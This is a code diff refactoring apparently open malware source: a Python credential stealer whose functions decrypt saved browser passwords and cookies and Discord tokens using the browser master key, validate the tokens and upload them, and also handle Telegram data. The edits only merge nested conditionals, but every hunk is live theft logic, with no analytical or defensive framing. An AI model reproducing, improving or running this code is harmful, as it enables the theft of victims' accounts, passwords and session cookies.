@@ -258,10 +258,9 @@ def GetTokens(path, arg):
                 ):
                     for token in re.findall(regex, line):
                         global Tokens
-                        if dclass.checkToken(token):
-                            if token not in Tokens:
-                                Tokens += token
-                                dclass.uploadToken(token)
+                        if dclass.checkToken(token) and token not in Tokens:
+                            Tokens += token
+                            dclass.uploadToken(token)
 
 
 Passw = []
@@ -304,9 +303,8 @@ def GetPasswords(path, arg):
                 if "https" in wa:
                     tmp = wa
                     wa = tmp.split("[")[1].split("]")[0]
-                if wa in row[0]:
-                    if old not in paswWords:
-                        paswWords.append(old)
+                if wa in row[0] and old not in paswWords:
+                    paswWords.append(old)
             Passw.append(
                 f"URL: {row[0]}|Username: {row[1]}|Password: {DecryptValue(row[2], master_key)}"
             )
@@ -340,12 +338,14 @@ def GetDiscord(path, arg):
                     global Tokens
                     tokenDecoded = DecryptValue(
                         b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
-                    if dclass.checkToken(tokenDecoded):
-                        if tokenDecoded not in Tokens:
-                            # print(token)
-                            Tokens += tokenDecoded
-                            # writeforfile(Tokens, 'tokens')
-                            dclass.uploadToken(tokenDecoded)
+                    if (
+                        dclass.checkToken(tokenDecoded)
+                        and tokenDecoded not in Tokens
+                    ):
+                        # print(token)
+                        Tokens += tokenDecoded
+                        # writeforfile(Tokens, 'tokens')
+                        dclass.uploadToken(tokenDecoded)
 
 def ZipTelegram(path, arg, procc):
     global OtherZip
@@ -407,9 +407,8 @@ def GetCookies(path, arg):
                 if "https" in wa:
                     tmp = wa
                     wa = tmp.split("[")[1].split("]")[0]
-                if wa in row[0]:
-                    if old not in cookiWords:
-                        cookiWords.append(old)
+                if wa in row[0] and old not in cookiWords:
+                    cookiWords.append(old)
             Cookies.append(
                 f"Host Key: {row[0]}|Name: {row[1]}|Value: {DecryptValue(row[2], master_key)}"
             )
